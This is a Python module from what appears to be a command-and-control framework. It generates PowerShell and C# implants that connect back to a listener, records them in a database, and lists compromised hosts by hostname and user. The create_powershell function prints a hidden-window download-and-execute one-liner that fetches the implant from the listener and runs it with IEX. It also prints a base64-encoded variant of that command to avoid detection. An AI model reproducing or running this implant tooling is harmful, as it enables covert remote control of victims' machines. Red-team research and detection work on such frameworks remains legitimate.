"""
Enhanced implant generation with agent manager integration
"""
from tabulate import tabulate
from time import sleep
import base64
import os
import shutil
from Core import listener, color, database
from Core.color import cyan, red
from Core.agentmanager import agent_manager


def create_powershell(conn, implant_name, key, listener_name, listener_ip, listener_port):
    """Generate PowerShell implant"""
    powershell_implant = open("Implants/powershell.ps1", "r").read() \
        .replace("REPLACE_KEY", key) \
        .replace("REPLACE_IP", listener_ip) \
        .replace("REPLACE_PORT", str(listener_port)) \
        .replace("REPLACE_NAME", implant_name)
    
    # Create implant directory
    implant_dir = f"data/implant/{implant_name}"
    os.makedirs(implant_dir, exist_ok=True)
    
    with open(f"{implant_dir}/host.ps1", "w") as f:
        f.write(powershell_implant)
    
    # Record in database
    database.rec_implant(conn, implant_name, key, listener_name, listener_ip, listener_port)
    
    # Register with agent manager
    agent_manager.register_agent(implant_name, key, listener_name, listener_ip, listener_port)
    
    print(f"[{color.green('+')}] {implant_name} PowerShell implant is ready.")
    print(f"\n[{color.cyan('*')}] One-liner to execute:")
    print(color.yellow(f'powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'http://{listener_ip}:{listener_port}/down/{implant_name}/host.ps1\')"'))
    
    print(f"\n[{color.cyan('*')}] Alternative encoded command:")
    cmd = f"IEX(New-Object Net.WebClient).DownloadString('http://{listener_ip}:{listener_port}/down/{implant_name}/host.ps1')"
    encoded = base64.b64encode(cmd.encode('utf-16-le')).decode()
    print(color.yellow(f'powershell.exe -nop -w hidden -enc {encoded}'))


def create_csharp_implant(conn, implant_name, key, listener_name, listener_ip, listener_port):
    """Generate C# implant with in-memory execution support"""
    # Read the C# implant template and replace placeholders
    with open("Implants/csharp_template.cs", "r") as f:
        csharp_implant = f.read() \
            .replace("REPLACE_KEY", key) \
            .replace("REPLACE_IP", listener_ip) \
            .replace("REPLACE_PORT", str(listener_port)) \
            .replace("REPLACE_NAME", implant_name)
    
    # Save the modified C# implant to a file
    implant_dir = f"data/implant/{implant_name}"
    os.makedirs(implant_dir, exist_ok=True)
    
    with open(f"{implant_dir}/implant.cs", "w") as f:
        f.write(csharp_implant)
    
    # Record in database
    database.rec_implant(conn, implant_name, key, listener_name, listener_ip, listener_port)
    
    # Register with agent manager
    agent_manager.register_agent(implant_name, key, listener_name, listener_ip, listener_port)
    
    print(f"[{color.green('+')}] {implant_name} C# implant is ready.")
    print(f"\n[{color.cyan('*')}] Source file: {implant_dir}/implant.cs")
    print(f"\n[{color.cyan('*')}] To compile (requires .NET SDK):")
    print(color.yellow(f'  csc /target:exe /out:{implant_dir}/implant.exe {implant_dir}/implant.cs'))
    print(f"\n[{color.cyan('*')}] Or with dotnet:")
    print(color.yellow(f'  Create a new project and add the source file'))
    
    # Also create a simple csproj for easier compilation
    # Use net8.0 for broader compatibility with modern .NET installations
    csproj_content = f'''<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net8.0</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
    <AssemblyName>{implant_name}</AssemblyName>
    <PublishSingleFile>true</PublishSingleFile>
    <SelfContained>false</SelfContained>
  </PropertyGroup>
</Project>'''
    
    with open(f"{implant_dir}/{implant_name}.csproj", "w") as f:
        f.write(csproj_content)
    
    print(f"\n[{color.cyan('*')}] Project file created: {implant_dir}/{implant_name}.csproj")
    print(color.yellow(f'  cd {implant_dir} && dotnet build -c Release'))


def GenerateImplant(conn, command):
    """Main implant generation function"""
    try:
        parts = command.split()
        
        if len(parts) < 5:
            print(f"[{color.red('-')}] Usage: implant generate <listener_name> <language> <implant_name>")
            print(f"[{color.blue('*')}] Languages: powershell, csharp")
            return
        
        listener_name = parts[2]
        implant_lang = parts[3].lower()
        implant_name = parts[4]
        
        # Generate unique key
        key = base64.b64encode(os.urandom(32)).decode()
        
        # Check if implant already exists
        results = database.return_key(conn, implant_name)
        
        if results:
            print(f"[{color.red('-')}] Implant '{implant_name}' already exists!")
            ask = input(f"[{color.cyan('*')}] Do you want to remove it and create new? (Y/N): ").lower()
            if ask == "y":
                StopImplant(conn, implant_name)
                # Continue to create new
            else:
                return
        
        # Get listener info
        listener_info = database.return_token(conn, listener_name)
        if not listener_info:
            print(f"[{color.red('-')}] Listener '{listener_name}' not found!")
            return
        
        listener_ip = listener_info[0][1]
        listener_port = listener_info[0][2]
        
        # Create implant directory
        implant_dir = f"data/implant/{implant_name}"
        os.makedirs(implant_dir, exist_ok=True)
        
        # Generate based on language
        if implant_lang == "powershell" or implant_lang == "ps1":
            create_powershell(conn, implant_name, key, listener_name, listener_ip, listener_port)
        elif implant_lang == "csharp" or implant_lang == "cs":
            create_csharp_implant(conn, implant_name, key, listener_name, listener_ip, listener_port)
        else:
            print(f"[{color.red('-')}] Unknown language: {implant_lang}")
            print(f"[{color.blue('*')}] Available: powershell, csharp")
    
    except Exception as e:
        print(f"[{color.red('-')}] Error generating implant: {str(e)}")


def StopImplant(conn, name):
    """Remove an implant"""
    try:
        # Remove from database
        database.Delete_Active_Implant(conn, name)
        
        # Remove from agent manager
        agent_manager.remove_agent(name)
        
        # Optionally remove files
        implant_dir = f"data/implant/{name}"
        if os.path.exists(implant_dir):
            try:
                shutil.rmtree(implant_dir)
            except:
                pass
        
        return True
    except Exception as e:
        print(f"[{color.red('-')}] Error removing implant: {str(e)}")
        return False


def ListImplant(conn):
    """List all implants with enhanced info"""
    # Get from database
    results = database.list_all_implants(conn)
    
    if not results:
        print(f"[{color.yellow('!')}] No implants registered")
        return
    
    data = []
    for agent in results:
        name = agent[0]
        active = agent[1]
        hostname = agent[2] or "-"
        username = agent[3] or "-"
        last_seen = agent[5] or "Never"
        
        # Check in-memory status
        mem_agent = agent_manager.get_agent(name)
        if mem_agent and mem_agent.active:
            status = color.green("Active")
        elif active:
            status = color.yellow("Stale")
        else:
            status = color.red("Inactive")
        
        data.append([
            cyan(name),
            status,
            hostname,
            username,
            last_seen
        ])
    
    print("\n", tabulate(data, headers=[
        red("Implant Name"),
        red("Status"),
        red("Hostname"),
        red("Username"),
        red("Last Seen")
    ], tablefmt="fancy_grid"), "\n")
